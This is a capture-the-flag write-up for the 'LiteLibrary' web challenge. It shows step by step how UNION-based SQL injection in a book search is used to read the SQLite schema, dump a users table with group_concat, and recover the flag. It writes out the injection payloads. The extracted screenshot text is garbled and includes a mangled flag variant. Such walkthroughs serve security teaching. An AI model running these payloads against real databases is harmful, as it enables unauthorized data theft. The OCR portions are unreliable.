# LiteLibrary
> Testing in prod. No worries are long as we are lighte :)

## About the Challenge
We were given a website without the source code, and this website only has 1 functionality which is search book


[Image extracted text: LiteLibrary
The
The Divine
CAMeT Fa
HoMiote
Comedy
DIVINECOMEDY
THE INFERRO;
HE Funtnoe
KnMeanise
Dante Alighieri
DANTE ALIGHIERI
928 pages
sent their own opinion regarding the authors ideas included in the book or passage they are a form of literary criticism that analyzes the authors ideas writing techniques and quality a book analys)]


## How to Solve?
the first vulnerability that comes to my mind is SQL injection. First, I tried UNION-based SQL injection:

```
' UNION SELECT 1,2,3,4,5-- -
```


[Image extracted text: Not Secure
litelibrary web nitectf livelapi/search?q-the%27%2Ounion%2Oselect%201,2,3,4,5--%20 -
[{"title":1,'
author":2,"pages" : 3,
imageLink" :4,"Link":5}]]


And then i tried to dump the table structure using this payload

```
' UNION SELECT 1,2,3,(SELECT sql FROM sqlite_schema limit),5-- -
```

There are 2 tables here:

* CREATE TABLE BOOKS (title TEXT, author TEXT, pages TEXT, imageLink TEXT, link TEXT)
* CREATE TABLE USERS (liteId TEXT, liteUsername TEXT, gender TEXT, liteNick TEXT, litePass TEXT, dateCreated TEXT)


[Image extracted text: 4
Not Secure
litelibrary web nitectf livelapigsearch?q-d%27%2Ounion%2Oselect%201,2,3,(SELECT%2Osq/%20FROM%2Osqlite_schema%2Olimit%201%20offset%2.
1 <
[{"title":1,"author":2, "pages" : 3,
'imageLink"
'CREATE TABLE USERS (liteId TEXT ,
liteUsername
TEXT , gender TEXT ,
liteNick TEXT ,
litePass TEXT ,
dateCreated TEXT)" ,"link":5}]]


And then dump everything using `group_concat()` function and we can get the flag inside `liteNick` columns


[Image extracted text: 1
GET
[apilsearch?q=
egory5542062 , consue(0306/42,millicent2186802 , Sharron4952622 , m
%20unions20select%20192c282c3%2c ( SELECTS2OGROUP_
CONCAT(liteNick
acias6874966
bradshaw7024223
moore4479889
shaw2676353,oneill3
%20from%20users
%2c5--%20-
HTTP/1.1
917808, powers8690516,earnestine6645535 ,
lette7522201,dotson
2
Host:
litelibrary
web  nitectf.live
3912053, lindsay3531831,mcleod8797009, lauren8536802
moreno2670
Cache-Control:
max-age-0
795 , campbell6816593, shelton7184870
smal15559029,elsie9932472 ,
Upgrade-Insecure-Requests
perry9509025, carter5730718, claudine9975913, eaton3327941,cleme
5
User-Agent
Mozilla/5.0
(Windows
NT
10.0;
Win64;
X64)
nts8463315,valeria2666678,wynn3283719,mccray6032298,nicole994
AppleWebKit/537.36
(KHTML ,
like
Gecko)
Chrome/120 _
0.6099.71
4281,manning2045219,carla247323,buckner2321603
ramos497233
wh
itney1933457
romero2232887
karing260886, tammie8080724,beverly
Safari/537.36
6
Accept
7070264,emerson311527
klein7406787,evangelina9290989
stevenso
text/html,application/xhtml+xml,application/xml;q-0.9, image/avif_
n279824,paige5636020,glenn2413218, lee4167479, hampton2362060,b
image/webp, image/apng,*/*;q-0.8,application/signed-exchange;v=b3;
urns1644135,garza7326036,mccullough7274635, curtis9783275 , J
itte2970143
knowles5040069, barroni798740, lourdes5478744,reyna
q=0 _
Accept-Encoding
gzip,
deflate,
br
7793445,schneider2913,grimes6524287,hart1512508,shields544603
7,clarke2653576
karina7701615,yang2718578
marcia3453167 , campo
54838983, goldie4139591
warren4567896,winters781241,tammi65134
41,lorna7725082,kaitlin273489,lloyd8274440,anita5423322,dicke
rson1784669
mayra4206843
sanford1265009,harper9087769
kendra5
659968,guerra2846023
acosta719122,hicks4052625,stein6064166
right355782, saundra7158702 , laurie4144590
1ena2562690, blackwel
13671128,nite{too_
11t3
huh_50m30n3_937
an71_g2avl7y_Ov3r_h3r3
}, lynne9001248
sadie2516667
alicia3374493,sheryl8812094,bryan
4105210 ,megan2046801,mcknight8574733,
rice3984225
mos ley474032
2,jones8382393
vanessa6360898, ednal43646,jacklyn4193375,aguil
ar3069848
0dom4658909
ina31438k3
marian8930094,munoz324307
9 , mamiel230954,bryant8991065,deann1823205
rebecca8841382,dele
0n8849610,steele7834384,kimberley214164,claire7966994, rodriqu
pau
brig
med_]


```
nite{t00_l1t3_huh_50m30n3_g37_an71_g2av17y_0v3r_h3r3}
```